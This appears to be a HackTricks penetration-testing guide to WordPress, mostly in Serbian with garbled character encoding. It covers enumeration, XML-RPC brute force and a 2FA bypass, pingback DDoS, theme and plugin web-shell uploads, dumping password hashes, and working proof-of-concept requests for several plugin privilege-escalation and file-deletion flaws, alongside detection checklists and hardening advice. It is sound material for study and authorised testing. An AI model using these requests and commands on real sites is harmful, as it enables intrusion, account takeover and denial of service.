# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

- **Otpremljeni fajlovi se nalaze na:** `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Fajlovi tema se nalaze u /wp-content/themes/,** tako da ako promenite neki php iz teme da dobijete RCE verovatno Ä‡ete koristiti taj put. Na primer: KoristeÄ‡i **theme twentytwelve** moÅ¾ete **pristupiti** fajlu **404.php** u: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **JoÅ¡ jedan koristan url moÅ¾e biti:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- U **wp-config.php** moÅ¾ete pronaÄ‡i root lozinku baze podataka.
- Podrazumevane putanje za login koje treba proveriti: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Glavni WordPress fajlovi**

- `index.php`
- `license.txt` sadrÅ¾i korisne informacije kao Å¡to je verzija WordPress-a koja je instalirana.
- `wp-activate.php` se koristi za proces aktivacije putem email-a prilikom podeÅ¡avanja novog WordPress sajta.
- Folderi za login (mogu biti preimenovani da bi se sakrili):
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php` je fajl koji predstavlja funkcionalnost WordPress-a koja omoguÄ‡ava prenos podataka koristeÄ‡i HTTP kao transportni mehanizam i XML kao mehanizam kodiranja. Ovaj naÄin komunikacije je zamenjen WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` je glavni direktorijum gde su smeÅ¡teni dodaci i teme.
- `wp-content/uploads/` je direktorijum gde se Äuvaju svi fajlovi otpremljeni na platformu.
- `wp-includes/` je direktorijum gde su smeÅ¡teni core fajlovi, kao Å¡to su sertifikati, fontovi, JavaScript fajlovi i widgeti.
- `wp-sitemap.xml` U WordPress verzijama 5.5 i novijim, WordPress generiÅ¡e sitemap XML fajl sa svim javnim postovima i javno upitnim tipovima postova i taksonomijama.

**Post exploitation**

- Fajl `wp-config.php` sadrÅ¾i informacije potrebne WordPress-u za povezivanje sa bazom podataka kao Å¡to su ime baze, database host, korisniÄko ime i lozinka, authentication keys i salts, i prefiks tabela u bazi. Ovaj konfiguracioni fajl se takoÄ‘e moÅ¾e koristiti za aktiviranje DEBUG moda, Å¡to moÅ¾e biti korisno pri reÅ¡avanju problema.

### Dozvole korisnika

- **Administrator**
- **Editor**: Objavljuje i upravlja sopstvenim i tuÄ‘im postovima
- **Author**: Objavljuje i upravlja sopstvenim postovima
- **Contributor**: PiÅ¡e i upravlja svojim postovima, ali ne moÅ¾e da ih objavi
- **Subscriber**: Pregleda postove i ureÄ‘uje svoj profil

## **Pasivna enumeracija**

### **Dobijanje WordPress verzije**

Proverite da li moÅ¾ete pronaÄ‡i fajlove `/license.txt` ili `/readme.html`

U izvornom kodu stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link fajlovi

![](<../../images/image (533).png>)

- JavaScript fajlovi

![](<../../images/image (524).png>)

### Preuzmi dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzimanje tema
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### IzvlaÄenje verzija uopÅ¡teno
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Dodaci i teme

Verovatno neÄ‡ete moÄ‡i da pronaÄ‘ete sve dostupne dodatke i teme. Da biste otkrili sve, moraÄ‡ete da **aktivno Brute Force listu dodataka i tema** (nadamo se da postoje automatizovani alati koji sadrÅ¾e te liste).

### Korisnici

- **ID Brute:** Dobijate vaÅ¾eÄ‡e korisnike sa WordPress sajta putem Brute Forcing-a korisniÄkih ID-jeva:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaÄi da je id **validan**. Ako je odgovor **400**, onda je id **nevalidan**.

- **wp-json:** TakoÄ‘e moÅ¾ete pokuÅ¡ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
JoÅ¡ jedan `/wp-json/` endpoint koji moÅ¾e otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Imajte na umu da ovaj endpoint izlaÅ¾e samo korisnike koji su objavili post. **BiÄ‡e dostupne samo informacije o korisnicima koji imaju omoguÄ‡enu ovu funkciju**.

TakoÄ‘e imajte na umu da **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Prilikom prijavljivanja na **`/wp-login.php`** **poruka** je **razliÄita** u zavisnosti od toga da li navedeno **korisniÄko ime postoji ili ne**.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (MoÅ¾ete automatizovati ovaj proces[ using this](https://github.com/relarizky/wpxploit) na primer).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Proveri**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce kredencijala**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za brute-force kredencijala. Ako moÅ¾ete pronaÄ‡i bilo koju od njih, moÅ¾ete poslati neÅ¡to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"Incorrect username or password"_ unutar odgovora sa status kodom 200 treba da se pojavi ako kredencijali nisu validni.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

KoriÅ¡Ä‡enjem ispravnih kredencijala moÅ¾ete otpremiti fajl. U odgovoru Ä‡e se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ova metoda je namenjena programima, ne ljudima, i zastarela je, zato ne podrÅ¾ava 2FA. Dakle, ako imate vaÅ¾eÄ‡e podatke za prijavu, ali je glavni ulaz zaÅ¡tiÄ‡en 2FA, **moÅ¾ete zloupotrebiti xmlrpc.php da se prijavite tim podacima zaobilaÅ¾enjem 2FA**. Imajte na umu da neÄ‡ete moÄ‡i da izvrÅ¡ite sve radnje koje su moguÄ‡e kroz konzolu, ali i dalje moÅ¾ete uspeti da doÄ‘ete do RCE kako Ippsec objaÅ¡njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
Ovo se moÅ¾e iskoristiti da se **hiljade** Wordpress **sajtova** naloÅ¾e da **pristupe** jednoj **lokaciji** (tako se na toj lokaciji izaziva **DDoS**) ili moÅ¾ete iskoristiti da naterate **Wordpress** da skenira neku internu **mreÅ¾u** (moÅ¾ete navesti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vrednoÅ¡Ä‡u **veÄ‡om** od **0** (17), to znaÄi da je port otvoren.

Pogledajte upotrebu **`system.multicall`** u prethodnom odeljku da biste nauÄili kako zloupotrebiti ovu metodu da biste izazvali DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ovaj fajl obiÄno postoji u root direktorijumu Wordpress sajta: **`/wp-cron.php`**\
Kada se ovaj fajl **accessed** izvrÅ¡i se "**heavy**" MySQL **query**, pa ga **attackers** mogu iskoristiti da izazovu **DoS**.\
TakoÄ‘e, po defaultu, `wp-cron.php` se poziva pri svakom uÄitavanju stranice (kad god client zahteva bilo koju Wordpress stranicu), Å¡to na sajtovima sa visokim saobraÄ‡ajem moÅ¾e praviti probleme (DoS).

PreporuÄuje se iskljuÄiti Wp-Cron i napraviti pravi cronjob na hostu koji izvrÅ¡ava potrebne akcije u regularnim intervalima (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

PokuÅ¡ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Wordpress sajt moÅ¾e napraviti zahtev prema vama.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li postoji **methodName: pingback.ping** i putanja **/wp-json/oembed/1.0/proxy**, i ako postoje, pokuÅ¡ava da ih exploit-uje.

## Automatski alati
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijanje pristupa prepisivanjem bita

ViÅ¡e kuriozitet nego stvarni napad. U CTF-u [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogao si da prebaciÅ¡ 1 bit u bilo kojoj wordpress datoteci. Dakle, mogao si da prebaciÅ¡ bit na poziciji `5389` u datoteci `/var/www/html/wp-includes/user.php` tako Å¡to bi zamenio NOT (`!`) operaciju NOP-om.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Izmena php fajla iz koriÅ¡Ä‡ene teme (admin credentials needed)**

Appearance â†’ Theme Editor â†’ 404 Template (sa desne strane)

Promeni sadrÅ¾aj u php shell:

![](<../../images/image (384).png>)

PotraÅ¾i na internetu kako moÅ¾eÅ¡ pristupiti toj aÅ¾uriranoj stranici. U ovom sluÄaju treba da pristupiÅ¡ ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¾eÅ¡ koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
da biste dobili sesiju.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Otpremite plugin i pritisnite Install Now:

![](<../../images/image (249).png>)

Kliknite na Procced:

![](<../../images/image (70).png>)

Verovatno ovo naizgled neÄ‡e niÅ¡ta uraditi, ali ako odete u Media, videÄ‡ete da je vaÅ¡ shell otpremljen:

![](<../../images/image (462).png>)

Pristupite tome i videÄ‡ete URL za izvrÅ¡avanje reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda podrazumeva instalaciju malicioznog plugina za koji je poznato da je ranjiv i koji se moÅ¾e iskoristiti za dobijanje web shella. Ovaj proces se izvodi kroz WordPress dashboard kako sledi:

1. **Plugin Acquisition**: Plugin se nabavlja sa izvora kao Å¡to je Exploit DB, na primer [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Idite u WordPress dashboard, zatim u `Dashboard > Plugins > Upload Plugin`.
- Otpremite zip fajl preuzetog plugina.
3. **Plugin Activation**: Kada je plugin uspeÅ¡no instaliran, morate ga aktivirati preko dashboarda.
4. **Exploitation**:
- Sa pluginom "reflex-gallery" instaliranim i aktiviranim, moÅ¾e se izvrÅ¡iti eksploatacija jer je poznat kao ranjiv.
- Metasploit framework obezbeÄ‘uje exploit za ovu ranjivost. UÄitavanjem odgovarajuÄ‡eg modula i izvrÅ¡avanjem specifiÄnih komandi moÅ¾e se uspostaviti meterpreter session, Å¡to daje neovlaÅ¡Ä‡en pristup sajtu.
- Napominje se da je ovo samo jedna od mnogih metoda za eksploataciju WordPress sajta.

SadrÅ¾aj ukljuÄuje vizuelna pomagala koja prikazuju korake u WordPress dashboardu za instalaciju i aktivaciju plugina. MeÄ‘utim, vaÅ¾no je napomenuti da je eksploatisanje ranjivosti na ovaj naÄin nezakonito i neetiÄno bez odgovarajuÄ‡e autorizacije. Ove informacije treba koristiti odgovorno i samo u legalnom kontekstu, kao Å¡to je penetration testing uz izriÄitu dozvolu.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost u **Remote Code Execution (RCE)** ili druge kritiÄne ranjivosti u WordPressu. Za viÅ¡e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). PruÅ¾a **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPressu.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Otpremite svoj custom plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Izmenite ugraÄ‘eni plugin u WordPressu.
- _**(RCE) Built-In Theme Edit:**_ Izmenite ugraÄ‘enu temu u WordPressu.
- _**(Custom) Custom Exploits:**_ Custom Exploits za Third-Party WordPress Plugins/Themes.

## Post Exploitation

Ekstrahujte korisniÄka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promeni administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Poznavanje naÄina na koji Wordpress plugin moÅ¾e izloÅ¾iti funkcionalnost kljuÄno je za pronalaÅ¾enje ranjivosti u toj funkcionalnosti. MoÅ¾ete videti kako plugin moÅ¾e izloÅ¾iti funkcionalnost u sledeÄ‡im taÄkama i neke primere ranjivih pluginova u [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naÄina na koji plugin moÅ¾e izloÅ¾iti funkcije korisnicima je preko AJAX handlera. Oni mogu sadrÅ¾ati greÅ¡ke u logici, autorizaciji ili autentifikaciji. Å taviÅ¡e, Äesto se deÅ¡ava da ove funkcije zasnivaju i autentifikaciju i autorizaciju na postojanju wordpress nonce-a koji **bilo koji autentifikovani korisnik u Wordpress instanci moÅ¾e imati** (neovisno o njegovoj ulozi).

Ovo su funkcije koje mogu biti upotrebljene za izlaganje funkcije u pluginu:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**KoriÅ¡Ä‡enje `nopriv` Äini endpoint dostupnim bilo kojim korisnicima (Äak i neautentifikovanim).**

> [!CAUTION]
> Å taviÅ¡e, ako funkcija samo proverava autorizaciju korisnika pomoÄ‡u funkcije `wp_verify_nonce`, ta funkcija samo proverava da li je korisnik prijavljen, a obiÄno ne proverava ulogu korisnika. Dakle, korisnici sa niskim privilegijama mogu imati pristup akcijama visokih privilegija.

- **REST API**

MoguÄ‡e je takoÄ‘e izloÅ¾iti funkcije iz wordpress-a registrujuÄ‡i REST API koristeÄ‡i funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` je callback funkcija koja proverava da li je dati korisnik ovlaÅ¡Ä‡en da pozove API metodu.

**Ako se koristi ugraÄ‘ena funkcija `__return_true`, jednostavno Ä‡e preskoÄiti proveru korisniÄkih permisija.**

- **Direktan pristup PHP fajlu**

Naravno, WordPress koristi PHP i fajlovi unutar plugin-ova su direktno dostupni preko web-a. Dakle, u sluÄaju da neki plugin izlaÅ¾e ranjivu funkcionalnost koja se aktivira samim pristupom fajlu, ona moÅ¾e biti iskoriÅ¡Ä‡ena od strane bilo kog korisnika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

Neki plugin-ovi implementiraju â€œtrusted headerâ€ preÄice za interne integracije ili reverse proxies i zatim koriste taj header da postave kontekst trenutnog korisnika za REST zahteve. Ako header nije kriptografski vezan za zahtev od strane upstream komponente, napadaÄ ga moÅ¾e spoof-ovati i pozivati privilegovane REST rute kao administrator.

- Impact: neautentifikovano eskaliranje privilegija do admin-a kreiranjem novog administratora preko core users REST rute.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (prisiljava user ID 1, obiÄno prvi administratorski nalog).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ZaÅ¡to funkcioniÅ¡e

- Plugin preslikava zaglavlje kontrolisano od strane klijenta u autentifikaciono stanje i preskaÄe provere capability-a.
- WordPress core oÄekuje `create_users` capability za ovu rutu; plugin hack ga zaobilazi direktnim postavljanjem konteksta trenutnog korisnika iz zaglavlja.

OÄekivani indikatori uspeha

- HTTP 201 sa JSON telom koje opisuje kreiranog korisnika.
- Novi admin korisnik vidljiv u `wp-admin/users.php`.

Kontrolna lista za detekciju

- PretraÅ¾ite (grep) za `getallheaders()`, `$_SERVER['HTTP_...']`, ili vendor SDKs koji Äitaju prilagoÄ‘ena zaglavlja da bi postavili kontekst korisnika (npr. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pregledajte REST registracije za privilegovane callback-e koji nemaju robusne `permission_callback` provere i umesto toga se oslanjaju na zaglavlja zahteva.
- PotraÅ¾ite upotrebe core funkcija za upravljanje korisnicima (`wp_insert_user`, `wp_create_user`) u REST handler-ima koje su kontrolisane samo vrednostima zaglavlja.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress teme i plugin-i Äesto izlaÅ¾u AJAX handlere putem `wp_ajax_` i `wp_ajax_nopriv_` hook-ova. Kada se koristi varijanta **_nopriv_** **callback postaje dostupan neautentifikovanim posetiocima**, pa svaka osetljiva akcija mora dodatno implementirati:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

Litho multipurpose tema (< 3.1) je zaboravila ta 3 kontrolna mehanizma u *Remove Font Family* feature i na kraju isporuÄila sledeÄ‡i kod (pojednostavljen):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi koje uvodi ovaj iseÄak:

* **Neautentifikovan pristup** â€“ registrovan je `wp_ajax_nopriv_` hook.
* **Nema nonce / provera privilegija** â€“ bilo koji posetilac moÅ¾e da pozove endpoint.
* **Nema sanitizacije putanje** â€“ `fontfamily` string koji kontroliÅ¡e korisnik se konkatenira sa fajl-sistemskom putanjom bez filtriranja, omoguÄ‡avajuÄ‡i klasiÄnu `../../` traversal.

#### Eksploatacija

NapadaÄ moÅ¾e obrisati bilo koji fajl ili direktorijum **ispod osnovnog direktorijuma uploads** (obiÄno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Checklist za detekciju

* Bilo koji `add_action( 'wp_ajax_nopriv_...')` callback koji poziva filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatencija nesanitizovanog korisniÄkog inputa u putanjama (traÅ¾i `$_POST`, `$_GET`, `$_REQUEST`).
* Nedostatak `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

---

### Eskalacija privilegija putem vraÄ‡anja zastarelih rola i nedostajuÄ‡e autorizacije (ASE "View Admin as Role")

Mnogi plugin-ovi implementiraju "view as role" ili privremenu promenu role tako Å¡to Äuvaju originalnu rolu/role u user meta da bi ih kasnije mogli vratiti. Ako put vraÄ‡anja zavisi samo od request parametara (npr. `$_REQUEST['reset-for']`) i interne liste odrÅ¾avane od strane plugina bez provere capabilities i validnog nonce-a, to postaje vertikalna eskalacija privilegija.

Primer iz realnog sveta je pronaÄ‘en u Admin and Site Enhancements (ASE) pluginu (â‰¤ 7.6.2.1). Grana za reset je vraÄ‡ala role bazirano na `reset-for=<username>` ako se korisniÄko ime pojavilo u internom nizu `$options['viewing_admin_as_role_are']`, ali nije izvrÅ¡ila ni `current_user_can()` proveru ni verifikaciju nonce-a pre nego Å¡to ukloni trenutne role i ponovo doda saÄuvane role iz user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ZaÅ¡to je iskoriÅ¡Ä‡ivo

- Veruje `$_REQUEST['reset-for']` i opciji plugina bez autorizacije na serverskoj strani.
- Ako je korisnik prethodno imao veÄ‡e privilegije saÄuvane u `_asenha_view_admin_as_original_roles`, a kasnije su mu smanjene, moÅ¾e ih vratiti pristupom putanji za reset.
- U nekim okruÅ¾enjima, bilo koji autentifikovani korisnik moÅ¾e pokrenuti reset za drugo korisniÄko ime koje je joÅ¡ uvek prisutno u `viewing_admin_as_role_are` (neispravna autorizacija).

Eksploatacija (primer)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Na ranjivim build-ovima ovo uklanja trenutne role i ponovo dodaje saÄuvane originalne role (npr. `administrator`), Äime se efektivno izvodi privilege escalation.

Detection checklist

- PotraÅ¾ite funkcije za prebacivanje rola koje Äuvaju originalne role u user meta (npr. `_asenha_view_admin_as_original_roles`).
- Identifikujte reset/restore putanje koje:
- ÄŒitaju korisniÄka imena iz `$_REQUEST` / `$_GET` / `$_POST`.
- Mijenjaju role preko `add_role()` / `remove_role()` bez `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizuju na osnovu niza opcija plugina (npr. `viewing_admin_as_role_are`) umesto na osnovu actorâ€™s capabilities.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

Neki pluginovi povezuju user-switching helper-e na public `init` hook i odreÄ‘uju identitet iz cookie-ja kontrolisanog od strane klijenta. Ako kod poziva `wp_set_auth_cookie()` bez provere autentikacije, capability i vaÅ¾eÄ‡eg nonce-a, bilo koji neautentifikovani posetilac moÅ¾e prisilno prijaviti kao proizvoljan user ID.

TipiÄan ranjiv obrazac (pojednostavljeno iz Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ZaÅ¡to je iskoriÅ¡Ä‡ivo

- Javni `init` hook Äini handler dostupnim neautentifikovanim korisnicima (nema `is_user_logged_in()` provere).
- Identitet potiÄe iz kolaÄiÄ‡a koji klijent moÅ¾e menjati (`original_user_id`).
- Direktan poziv `wp_set_auth_cookie($uid)` prijavljuje zahtevaoca kao tog korisnika bez bilo kakvih capability/nonce provera.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF razmatranja za WordPress/plugin CVEs

GeneriÄki edge/server WAF-ovi su podeÅ¡eni za Å¡iroke obrasce (SQLi, XSS, LFI). Mnogi highâ€‘impact WordPress/plugin propusti su application-specific logic/auth bagovi koji izgledaju kao benigni saobraÄ‡aj osim ako engine ne razume WordPress rute i semantiku plugina.

Offensive notes

- Ciljajte plugin-specific endpoints sa Äistim payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prvo testirajte unauth paths (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads Äesto uspevaju bez obfuscation.
- TipiÄni sluÄajevi visokog uticaja: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Ne oslanjajte se na generiÄke WAF signatures da zaÅ¡tite plugin CVEs. Implementirajte application-layer, vulnerability-specific virtual patches ili brzo aÅ¾urirajte.
- Dajte prednost positive-security proverama u kodu (capabilities, nonces, strict input validation) umesto negativnih regex filtera.

## WordPress Protection

### Regular Updates

Uverite se da su WordPress, plugins, i themes aÅ¾urirani. TakoÄ‘e potvrdite da je automated updating omoguÄ‡eno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
TakoÄ‘e, **instalirajte samo pouzdane WordPress dodatke i teme**.

### Sigurnosni dodaci

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

- Uklonite podrazumevanog korisnika **admin**
- Koristite **jake lozinke** i **2FA**
- Povremeno **pregledajte dozvole** korisnika
- **OgraniÄite pokuÅ¡aje prijave** da biste spreÄili Brute Force napade
